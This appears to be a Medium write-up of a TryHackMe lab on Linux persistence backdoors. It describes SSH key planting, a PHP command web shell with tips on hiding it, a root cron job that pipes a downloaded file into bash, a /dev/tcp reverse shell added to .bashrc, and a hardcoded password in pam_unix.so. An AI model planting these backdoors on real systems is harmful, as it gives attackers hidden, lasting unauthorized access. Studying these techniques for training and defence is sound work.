::: {}
# Linux Backdoors Tryhackme Writeup {#linux-backdoors-tryhackme-writeup .p-name}
:::

::: {.section .p-summary field="subtitle"}
This is a Writeup of Tryhackme room "Linux Backdoors"
:::

::::::: {.section .e-content field="body"}
:::::: {#b6e6 .section .section .section--body .section--first .section--last}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### Linux Backdoors Tryhackme Writeup {#188e .graf .graf--h3 .graf--leading .graf--title name="188e"}

**This is a Writeup of Tryhackme room "Linux Backdoors"**

<figure id="5eb7" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*epYZqFR2N5SJW97C.png"
class="graf-image" data-image-id="0*epYZqFR2N5SJW97C.png"
data-width="437" data-height="245" data-is-featured="true" />
</figure>

**Room link:**
[https://tryhackme.com/room/linuxbackdoors](https://tryhackme.com/room/linuxbackdoors){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/room/linuxbackdoors"
rel="noopener ugc nofollow noopener" target="_blank"}\
**Note: This room is Free**

### Task 1: Introduction {#4e58 .graf .graf--h3 .graf-after--p name="4e58"}

Hey everyone!

This room is dedicated for learning common Linux backdoors techniques! A
backdoor is simply something we can do to ensure our consistent access
to the machine.

So even if the machine is rebooted, shut down or whatever, we would
still be able to have access to it.

These aren't actual vulnerabilities but just ways to maintain your
access on a target :)

To recreate all the backdoor techniques shown in this room, you could
simply try them all on your own machine or use the "THM ATTACK BOX" as
it's

safer and it doesn't matter if you screw anything up.

Happy Hacking!

### Task 2: SSH Backdoors {#8116 .graf .graf--h3 .graf-after--p name="8116"}

The first backdoor we are going to look at is: The SSH Backdoor

The ssh backdoor essentially consists of leaving our ssh keys in some
user's home directory. Usually the user would be root as it's the user
with the highest privileges.

So Let's generate a set of ssh keys with ssh-keygen!

To do so, simply run the command ssh-keygen as shown below!

<figure id="ff62" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*xgsfx_feKgWCZOyw.png"
class="graf-image" data-image-id="0*xgsfx_feKgWCZOyw.png"
data-width="695" data-height="402" />
</figure>

[https://tryhackme.com/room/linuxbackdoors](https://tryhackme.com/room/linuxbackdoors){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/room/linuxbackdoors"
rel="noopener ugc nofollow noopener" target="_blank"}

Now that we have 2 keys. 1 private key and 1 public key, we can now go
to /root/.ssh and leave our public key there. Don't forget to rename the
public key to : authorized_keys

If the directory .ssh is not present, you can always create it using
this command : "mkdir .ssh"

Now that we have left our backdoor, we can simply login as root!

Before doing so, give the private key the right permissions using :
chmod 600 id_rsa.

This is necessary because if we don't do it, ssh will complain about
permissions not being secure enough on the key and will most likely ,
not let us use it.

After giving the key the right permissions, we can do : "ssh -i id_rsa
root@ip" to login into our desired machine!

One thing to note about this backdoor is:

1.  [This backdoor isn't hidden at all. Anybody with the right
    permissions would be able to remove our ssh public key or the file
    authorized_keys entirely.]{#9bd2}

**Q.1:** In what directory do we place our keys ?

> ***Answer: .ssh***

What flag in ssh do we use to show our private key?

> ***Answer: -i***

### Task 3: PHP Backdoors {#c7fe .graf .graf--h3 .graf-after--blockquote name="c7fe"}

Let's now get into the second backdoor: PHP Backdoors!

If you get root access on a Linux host, you will most likely search for
creds and or any useful information in the web root.

The web root is usually located in : /var/www/html

What you have to know is that, whatever you leave in /var/www/html, will
be available for everybody to use in their browser.

Now that you know that, you can try creating a php file with any name
and putting inside this piece of code:

<figure id="9ec4" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/1*HjPPJghZD8mV9RDL8GXJ8w.png"
class="graf-image" data-image-id="1*HjPPJghZD8mV9RDL8GXJ8w.png"
data-width="842" data-height="157" />
</figure>

This code simply takes the parameter "cmd" and will execute anything
that is being given to that parameter.\
Notice that we are using : "**\$\_REQUEST\['cmd'\])**", which means that
you can pass that parameter either in GET or in POST data.\
Now that file is saved and ready , we can try to query it.\
If you left the file in **/var/www/html/shell.php** \| You should be
able to access it directly using :
[**http://ip/shell.php**](http://ip/shell.php){.markup--anchor
.markup--p-anchor data-href="http://ip/shell.php"
rel="noopener ugc nofollow noopener" target="_blank"}\
If you left the shell somewhere else, look in what directory it is and
then try accessing it by doing something like that :
[**http://ip/somedirectory/shell.php**](http://ip/somedirectory/shell.php){.markup--anchor
.markup--p-anchor data-href="http://ip/somedirectory/shell.php"
rel="noopener ugc nofollow noopener" target="_blank"}

Here are some ways that we could make this backdoor a little more
hidden:

1\. Try to add this piece of code in already existing php files in
/var/www/html. Adding it more towards the middle of files will
definitely make our malicious actions a little more secret.

2\. Change the "cmd" parameter to something else... anything actually...
just change it to something that isn't that common. "Cmd" is really
common and is already really well known in the hacking community.

### Task 4: CronJob Backdoors {#b495 .graf .graf--h3 .graf-after--p name="b495"}

Let's now get into the 3rd backdoor technique!

This backdoor consists of creating a cronjob!

If you take a look at your cronjobs file, which is /etc/cronjob, you
would see something like this:

<figure id="1214" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*r09yH-1TZt6rjaJh.png"
class="graf-image" data-image-id="0*r09yH-1TZt6rjaJh.png"
data-width="749" data-height="240" />
</figure>

[https://tryhackme.com/room/linuxbackdoors](https://tryhackme.com/room/linuxbackdoors){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/room/linuxbackdoors"
rel="noopener ugc nofollow noopener" target="_blank"}

This represents all the tasks that are scheduled to run at some time on
your machine.

Once you got root access on any host, you can add any scheduled task.
You could even just configure a task where every minute a reverse shell
is sent to you. Which is exactly what we're going to do.

Notice the 2 letters on top of the tasks : "m and h"

Those are the letters that indicate if the task should run every hour or
every minute.

In the example above, you can see that there is a "\*" symbol under the
"h". This means that the following task would run every hour.

Now let's get to our backdoor!

Add this line into our cronjob file :

\* \* \* \* \* root curl http://\<yourip\>:8080/shell \| bash

Notice that we put a "\*" star symbol to everything. This means that our
task will run every minute, every hour, every day , etc .

We first use "curl" to download a file , and then we pipe it to "bash"

The contents of the "shell" file that we are using are simply :

--- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- -

#!/bin/bash

bash -i \>& /dev/tcp/ip/port 0\>&1

--- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- ---

We would have to run an HTTP server serving our shell.

You can achieve this by running : "python3 -m http.server 8080"

Once our shell gets downloaded, it will be executed by "bash" and we
would get a shell!

\*Don't forget to listen on your specified port with "nc -nvlp
\<port\>"\*

Please note that this backdoor isn't really hidden because everyone can
see it just by looking inside /etc/crontab.

**Q.1:** What does the letter "m" mean in cronjobs?

> ***Answer: minute***

**Q.2:** What does the letter "h" mean in cronjobs?

> ***Answer: hour***

### Task 5: .bashrc Backdoors {#79df .graf .graf--h3 .graf-after--blockquote name="79df"}

Let's now get into the: ".bashrc" Backdoor!

If a user has bash as their login shell, the ".bashrc" file in their
home directory is executed when an interactive session is launched.

So If you know any users that log on to their system quite often, you
could simply run this command to include your reverse shell into their
".bashrc".

``` {#a097 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
echo 'bash -i >& /dev/tcp/ip/port 0>&1' >> ~/.bashrc
```

One important thing is to always have your nc listener ready as you
don't know when your user will log on.\
This attack is very sneaky as nobody really thinks about ever checking
their ".bashrc" file.\
On the other hand, you can't exactly know if any of the user's will
actually login to their system, so you might really wait a long period
of time.

### Task 6: pam_unix.so Backdoors {#81e6 .graf .graf--h3 .graf-after--p name="81e6"}

Let's now get into the 5th and last backdoor of this room!

There are many many more backdoors available other than the 5 shown in
this room!

A good resource that I found really helpful when creating this room is:
[**link**](https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c){.markup--anchor
.markup--p-anchor
data-href="https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c"
rel="noopener" target="_blank"}

Okay so, now onto the 5th backdoor.

The backdoor that we are going to look at is: The pam_unix.so backdoor!

If you don't know what the file "pam_unix.so" is , well , it simply is
one of many files in Linux that is responsible for authentication.

So let's actually get into the backdoor!

<figure id="5efc" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*elyqCxDnMBlquNR2.png"
class="graf-image" data-image-id="0*elyqCxDnMBlquNR2.png"
data-width="586" data-height="160" />
</figure>

[https://tryhackme.com/room/linuxbackdoors](https://tryhackme.com/room/linuxbackdoors){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/room/linuxbackdoors"
rel="noopener ugc nofollow noopener" target="_blank"}

As seen here, the file "pam_unix.so" uses the "unix_verify_password"
function to verify to user's supplied password.

Now let's look at this screenshot:

<figure id="3c89" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*lrp8ZpEaHotfdVaQ.png"
class="graf-image" data-image-id="0*lrp8ZpEaHotfdVaQ.png"
data-width="626" data-height="228" />
</figure>

[https://tryhackme.com/room/linuxbackdoors](https://tryhackme.com/room/linuxbackdoors){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/room/linuxbackdoors"
rel="noopener ugc nofollow noopener" target="_blank"}

We can see that we added a new line to our code : "if (strcmp(p,
"0xMitsurugi") != 0 )"

Okay, if this code looks confusing to you at first, don't worry!

We'll break it down together!

So first, we have to know what the function "strcmp" does.

This function basically compares 2 strings.

In the screenshot above, we compare the variable "p" and the string
"0xMitsurugi".

The variable "p" stands for the user's supplied password. In other
words, the password that the user-supplied.

You can also see "!=0" at the end of the statement. This means "if not
successful". So, if the variable "p"(user-supplied password) and the
string "0xMitsurugi" are NOT the same... the function
"unix_verify_password" will be used.

But on the other hand, if the variable "p"(user-supplied password) and
the string "0xMitsurugi" are the same, the authentication is a success.
We mark the success by using "PAM_SUCCESS;"

So this backdoor essentially consists of adding your own password to
"pam_unix.so"

Since you know the password that you added into the file, you will
always be able to authenticate with that password until it's removed
from "pam_unix.so"

So let's do a little recap:

Say a user types the password "password123" and tries to authenticate.
We will compare his password(password123) to the string "0xMitsurugi".

If those two strings match, the authentication is successful. But those
2 strings do not match, so the authentication will not be

successful and will rely on the "unix_verify_password" function. When
using the "unix_verify_password" function to authenticate, the function
takes

the user's password from "/etc/shadow" and compares it to the user's
supplied password. This is how the intended authentication system should
work.

However, this technique is called a backdoor as you add your own
password that you can always use as long as nobody takes it out of
"pam_unix.so".

This backdoor is really hard to spot, as once again, nobody really
thinks about looking into such files.

Since this method is slowly becoming more and more popular, you probably
won't be able to do it every time, as everybody would slowly but surely,
understand how to protect themselves.

Resource used :
[http://0x90909090.blogspot.com/2016/06/creating-backdoor-in-pam-in-5-line-of.html](http://0x90909090.blogspot.com/2016/06/creating-backdoor-in-pam-in-5-line-of.html){.markup--anchor
.markup--p-anchor
data-href="http://0x90909090.blogspot.com/2016/06/creating-backdoor-in-pam-in-5-line-of.html"
rel="noopener ugc nofollow noopener" target="_blank"}

Here is a GitHub repository containing a script automating this process
of creating a backdoor:
[https://github.com/zephrax/linux-pam-backdoor](https://github.com/zephrax/linux-pam-backdoor){.markup--anchor
.markup--p-anchor
data-href="https://github.com/zephrax/linux-pam-backdoor"
rel="noopener ugc nofollow noopener" target="_blank"}

### Promote and Collaborate on Cybersecurity Insights {#8dcd .graf .graf--h3 .graf-after--p name="8dcd"}

We are excited to offer promotional opportunities and guest post
collaborations on our blog and website, focusing on all aspects of
cybersecurity. Whether you're an expert with valuable insights to share
or a business looking to reach a wider audience, our platform provides
the perfect space to showcase your knowledge and services. Let's work
together to enhance our community's understanding of cybersecurity!

### About the Author: {#5a6a .graf .graf--h3 .graf-after--p name="5a6a"}

[Vijay
Gupta](https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2){.markup--anchor
.markup--p-anchor
data-href="https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2"
rel="noopener" target="_blank"} is a cybersecurity enthusiast with
several years of experience in cyber security, [cyber crime forensics
investigation](https://play.google.com/store/books/details?id=VRz7EAAAQBAJ){.markup--anchor
.markup--p-anchor
data-href="https://play.google.com/store/books/details?id=VRz7EAAAQBAJ"
rel="noopener ugc nofollow noopener" target="_blank"}, and security
awareness training in schools and colleges. With a passion for
safeguarding digital environments and educating others about
cybersecurity best practices, Vijay has dedicated his career to
promoting cyber safety and resilience. Stay connected with Vijay Gupta
on various social media platforms and professional networks to access
valuable insights and stay updated on the latest cybersecurity trends.
:::
::::
::::::
:::::::

By [Vijay Kumar Gupta](https://medium.com/@bevijaygupta){.p-author
.h-card} on [August 19, 2024](https://medium.com/p/655f2db8c884).

[Canonical
link](https://medium.com/@bevijaygupta/linux-backdoors-tryhackme-writeup-655f2db8c884){.p-canonical}

Exported from [Medium](https://medium.com) on February 9, 2026.
